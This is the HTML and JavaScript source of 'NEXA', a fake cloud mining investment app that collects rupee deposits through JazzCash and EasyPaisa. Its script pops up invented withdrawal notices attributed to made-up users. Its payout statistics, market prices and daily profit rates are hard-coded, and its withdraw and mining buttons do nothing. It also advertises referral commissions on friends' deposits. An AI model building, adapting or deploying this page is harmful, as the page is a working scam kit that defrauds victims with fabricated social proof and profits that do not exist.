<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NEXA | Enterprise Cloud Mining</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        :root { --p: #2563EB; --s: #0F172A; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: #f8fafc; color: var(--s); scroll-behavior: smooth; }
        .glass { background: rgba(255,255,255,0.9); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.4); }
        .card-neo { border-radius: 32px; background: #fff; box-shadow: 0 20px 40px -15px rgba(0,0,0,0.05); }
        .btn-grad { background: linear-gradient(135deg, #2563EB, #4F46E5); color: white; border-radius: 20px; font-weight: 800; text-transform: uppercase; letter-spacing: 1px; transition: 0.3s; }
        .nav-icon { font-size: 22px; color: #94a3b8; transition: 0.3s; cursor: pointer; }
        .nav-active { color: var(--p) !important; transform: scale(1.1); }
        .hidden { display: none !important; }
        #live-notif { position: fixed; top: 20px; left: 20px; right: 20px; z-index: 9999; transform: translateY(-150%); transition: 0.6s cubic-bezier(0.68, -0.55, 0.27, 1.55); }
        .notif-active { transform: translateY(0) !important; }
    </style>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
        import { getDatabase, ref, set, get, update, onValue } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
            apiKey: "AIzaSyBe5Q5jXpx3UvrHC9WOky9UWeDnP9SPfZI",
            authDomain: "verbose-6c008.firebaseapp.com",
            databaseURL: "https://verbose-6c008-default-rtdb.firebaseio.com",
            projectId: "verbose-6c008",
            storageBucket: "verbose-6c008.firebasestorage.app",
            messagingSenderId: "867100945312",
            appId: "1:867100945312:web:315dfb48fb34496cee12c5"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getDatabase(app);

        // --- Core Engine ---
        window.handleLogin = async (mode) => {
            const user = document.getElementById('u-name').value;
            if(!user) return alert("Sweetie, enter username first! 💋");
            try {
                await signInAnonymously(auth);
                const uid = auth.currentUser.uid;
                const userRef = ref(db, 'users/' + uid);
                const snap = await get(userRef);
                if(mode === 'new' && !snap.exists()) {
                    await set(userRef, { username: user, balance: 2.0, pkr: 200, uid: uid });
                    localStorage.setItem('nexa_uid', uid);
                    location.reload();
                } else if(mode === 'old' && snap.exists()) {
                    localStorage.setItem('nexa_uid', uid);
                    location.reload();
                } else { alert("User profile error!"); }
            } catch (e) { alert(e.message); }
        };

        window.onload = () => {
            const uid = localStorage.getItem('nexa_uid');
            if(uid) {
                document.getElementById('auth-page').classList.add('hidden');
                document.getElementById('app-page').classList.remove('hidden');
                startApp(uid);
                showLivePopups();
            }
        };

        function startApp(uid) {
            onValue(ref(db, 'users/' + uid), (s) => {
                const d = s.val();
                document.getElementById('nav-username').innerText = d.username;
                document.getElementById('bal-usd').innerText = "$" + d.balance.toFixed(2);
                document.getElementById('bal-pkr').innerText = "Rs. " + d.pkr;
            });
            onValue(ref(db, 'admin/settings'), (s) => { window.sysSet = s.val(); });
        }

        function showLivePopups() {
            const msg = ["Just withdrawn $400", "Purchased Alpha Node", "Received Referral Bonus", "Withdrawn Rs. 5000"];
            const users = ["Sarah K.", "M. Zain", "Ali786", "Fatima", "Admin_Nexa"];
            setInterval(() => {
                const toast = document.getElementById('live-notif');
                document.getElementById('notif-text').innerText = users[Math.floor(Math.random()*users.length)] + ": " + msg[Math.floor(Math.random()*msg.length)];
                toast.classList.add('notif-active');
                setTimeout(() => toast.classList.remove('notif-active'), 4000);
            }, 10000);
        }

        window.openPay = (type) => {
            const num = type === 'jazz' ? window.sysSet.jazz : window.sysSet.easy;
            prompt(`Please send payment to ${type.toUpperCase()}:\n${num}\n\nPaste Transaction ID below:`, "");
        };

        window.switchTab = (tab) => {
            ['home', 'mine', 'wallet', 'info'].forEach(t => document.getElementById('sec-'+t).classList.add('hidden'));
            document.getElementById('sec-'+tab).classList.remove('hidden');
            document.querySelectorAll('.nav-icon').forEach(i => i.classList.remove('nav-active'));
            event.currentTarget.classList.add('nav-active');
        };
    </script>
</head>
<body class="pb-28">

    <!-- Live Notif -->
    <div id="live-notif" class="glass p-4 rounded-3xl shadow-2xl flex items-center gap-4 border-l-4 border-blue-600">
        <div class="w-10 h-10 bg-blue-100 text-blue-600 rounded-full flex items-center justify-center"><i class="fa-solid fa-bell"></i></div>
        <p id="notif-text" class="text-xs font-black"></p>
    </div>

    <!-- Auth -->
    <div id="auth-page" class="fixed inset-0 bg-white z-[10000] p-10 flex flex-col justify-center">
        <div class="text-center mb-10">
            <div class="w-20 h-20 bg-blue-600 rounded-[2.5rem] flex items-center justify-center mx-auto rotate-12 mb-6">
                <i class="fa-solid fa-bolt text-white text-3xl -rotate-12"></i>
            </div>
            <h1 class="text-4xl font-black italic tracking-tighter">NEXA PRO</h1>
            <p class="text-[10px] font-black text-slate-400 mt-2 uppercase tracking-widest">Quantum Mining Terminal</p>
        </div>
        <div class="space-y-4">
            <input id="u-name" type="text" placeholder="Your Username" class="w-full p-5 bg-slate-50 border rounded-2xl outline-none font-bold">
            <button onclick="handleLogin('new')" class="w-full btn-grad py-5 shadow-lg shadow-blue-100 text-xs">Register Account</button>
            <button onclick="handleLogin('old')" class="w-full bg-slate-900 text-white py-5 rounded-2xl font-black text-xs uppercase tracking-widest">Login Terminal</button>
        </div>
    </div>

    <!-- App Page -->
    <div id="app-page" class="hidden">
        <header class="p-6 sticky top-0 bg-white/90 backdrop-blur-md z-50 flex justify-between items-center border-b">
            <div class="flex items-center gap-3">
                <div class="w-10 h-10 bg-blue-600 rounded-2xl flex items-center justify-center text-white"><i class="fa-solid fa-user-shield"></i></div>
                <div>
                    <h2 id="nav-username" class="text-sm font-black italic">...</h2>
                    <span class="text-[8px] font-black text-green-500 uppercase">● Online Now</span>
                </div>
            </div>
            <div class="text-right">
                <h3 id="bal-usd" class="text-xl font-black text-blue-600">$0.00</h3>
                <p id="bal-pkr" class="text-[9px] font-bold text-slate-400">Rs. 0</p>
            </div>
        </header>

        <main class="p-5">
            
            <!-- Home (Details Section) -->
            <div id="sec-home" class="space-y-8">
                <div class="card-neo p-8 bg-slate-900 text-white relative overflow-hidden">
                    <h1 class="text-3xl font-black italic mb-2 leading-tight">Secure Your <br><span class="text-blue-500">Wealth</span> Future.</h1>
                    <p class="text-[10px] text-slate-400 font-bold mb-8 uppercase tracking-widest">The World's Most Powerful Mining Infrastructure</p>
                    <div class="flex gap-4">
                        <button onclick="switchTab('mine')" class="btn-grad px-6 py-3 text-[10px]">Start Mining</button>
                        <button onclick="switchTab('info')" class="bg-white/10 px-6 py-3 rounded-2xl text-[10px] font-black">Learn More</button>
                    </div>
                </div>

                <!-- Live Market Data -->
                <div class="grid grid-cols-2 gap-4">
                    <div class="card-neo p-4 border-l-4 border-orange-500">
                        <div class="flex items-center gap-2 mb-2"><i class="fa-brands fa-bitcoin text-orange-500"></i><span class="text-[10px] font-black">BTC/USD</span></div>
                        <p class="text-sm font-black">$67,420.50</p>
                        <span class="text-[8px] text-green-500 font-bold">+2.4% Today</span>
                    </div>
                    <div class="card-neo p-4 border-l-4 border-blue-500">
                        <div class="flex items-center gap-2 mb-2"><i class="fa-brands fa-ethereum text-blue-500"></i><span class="text-[10px] font-black">ETH/USD</span></div>
                        <p class="text-sm font-black">$3,840.12</p>
                        <span class="text-[8px] text-red-500 font-bold">-0.1% Today</span>
                    </div>
                </div>

                <!-- Platform Stats Details -->
                <div class="card-neo p-6 space-y-6">
                    <h3 class="text-xs font-black uppercase tracking-widest text-slate-400">Platform Overview</h3>
                    <div class="flex justify-between items-center">
                        <div class="text-center"><p class="text-xl font-black">15K+</p><p class="text-[8px] font-bold text-slate-400 uppercase">Total Members</p></div>
                        <div class="text-center"><p class="text-xl font-black">$2.4M</p><p class="text-[8px] font-bold text-slate-400 uppercase">Paid Out</p></div>
                        <div class="text-center"><p class="text-xl font-black">480</p><p class="text-[8px] font-bold text-slate-400 uppercase">Active Nodes</p></div>
                    </div>
                    <p class="text-[11px] text-slate-500 font-bold leading-relaxed border-t pt-4">NEXA is a next-generation cloud mining protocol designed for maximum transparency and highest daily yields in the market.</p>
                </div>
            </div>

            <!-- Mining Section -->
            <div id="sec-mine" class="hidden space-y-6">
                <h3 class="text-[10px] font-black uppercase text-slate-400 tracking-widest px-2">Premium Dollar Nodes ($)</h3>
                <div class="card-neo p-6 border-b-4 border-blue-600">
                    <div class="flex justify-between mb-6">
                        <div class="w-12 h-12 bg-blue-50 text-blue-600 rounded-2xl flex items-center justify-center text-xl"><i class="fa-solid fa-microchip"></i></div>
                        <div class="text-right font-black text-2xl">$5.00</div>
                    </div>
                    <h4 class="font-black text-lg">Quantum Core Alpha</h4>
                    <p class="text-[10px] text-slate-400 font-bold mb-6 italic">Profit: $0.45/Day • Contract: 360 Days</p>
                    <button class="w-full btn-grad py-4">Activate Mining</button>
                </div>

                <h3 class="text-[10px] font-black uppercase text-slate-400 tracking-widest px-2 mt-8">Economy PKR Nodes (Rs.)</h3>
                <div class="card-neo p-6 border-b-4 border-slate-900">
                    <div class="flex justify-between mb-6">
                        <div class="w-12 h-12 bg-slate-50 text-slate-900 rounded-2xl flex items-center justify-center text-xl"><i class="fa-solid fa-bolt"></i></div>
                        <div class="text-right font-black text-2xl">Rs. 250</div>
                    </div>
                    <h4 class="font-black text-lg">Starter Pulse Node</h4>
                    <p class="text-[10px] text-slate-400 font-bold mb-6 italic">Profit: Rs. 18/Day • Contract: 360 Days</p>
                    <button class="w-full bg-slate-900 text-white py-4 rounded-2xl font-black text-[10px] uppercase">Activate Mining</button>
                </div>
            </div>

            <!-- Wallet -->
            <div id="sec-wallet" class="hidden space-y-6">
                <div class="card-neo p-8 text-center bg-blue-600 text-white">
                    <p class="text-[10px] font-black opacity-60 uppercase mb-2">Total Dividends</p>
                    <h1 id="wal-usd" class="text-4xl font-black">$0.00</h1>
                    <div class="flex gap-4 mt-8">
                        <button onclick="openPay('jazz')" class="flex-1 bg-white text-blue-600 py-4 rounded-xl font-black text-[10px] uppercase">Deposit</button>
                        <button class="flex-1 bg-white/20 py-4 rounded-xl font-black text-[10px] uppercase">Withdraw</button>
                    </div>
                </div>
                <div class="card-neo p-6">
                    <h4 class="text-xs font-black uppercase mb-4">Payment Methods</h4>
                    <div class="flex gap-4">
                        <i class="fa-solid fa-phone text-green-500 text-2xl"></i>
                        <i class="fa-solid fa-wallet text-blue-500 text-2xl"></i>
                        <i class="fa-solid fa-credit-card text-teal-500 text-2xl"></i>
                        <i class="fa-brands fa-bitcoin text-slate-400 text-2xl"></i>
                    </div>
                </div>
            </div>

            <!-- Information Details -->
            <div id="sec-info" class="hidden space-y-6">
                <div class="card-neo p-6">
                    <h2 class="font-black text-lg mb-4 italic">Security & Infrastructure</h2>
                    <p class="text-xs text-slate-500 leading-relaxed font-medium">
                        Our nodes are hosted in top-tier data centers across the globe. We use SSL encryption and 2FA protocols to ensure that every withdrawal is verified. NEXA uses a <b>Proof-of-Stake-Mining</b> algorithm to generate stable daily profits for its members.
                    </p>
                </div>
                <div class="card-neo p-6 bg-blue-50 border-none">
                    <h3 class="font-black text-xs uppercase mb-3">Referral Program</h3>
                    <p class="text-[11px] text-slate-600 leading-relaxed font-bold">
                        Invite your friends and earn <b>10% commission</b> on their every deposit. Commissions are added instantly to your dollar balance.
                    </p>
                </div>
            </div>

        </main>

        <!-- Navigation Bar -->
        <nav class="fixed bottom-6 left-6 right-6 h-20 glass rounded-[2.5rem] flex justify-around items-center px-6 z-50 shadow-2xl">
            <button onclick="switchTab('home')" class="nav-icon nav-active"><i class="fa-solid fa-house-user"></i></button>
            <button onclick="switchTab('mine')" class="nav-icon"><i class="fa-solid fa-server"></i></button>
            <button onclick="switchTab('wallet')" class="nav-icon"><i class="fa-solid fa-wallet"></i></button>
            <button onclick="switchTab('info')" class="nav-icon"><i class="fa-solid fa-shield-heart"></i></button>
        </nav>
    </div>

</body>
</html>
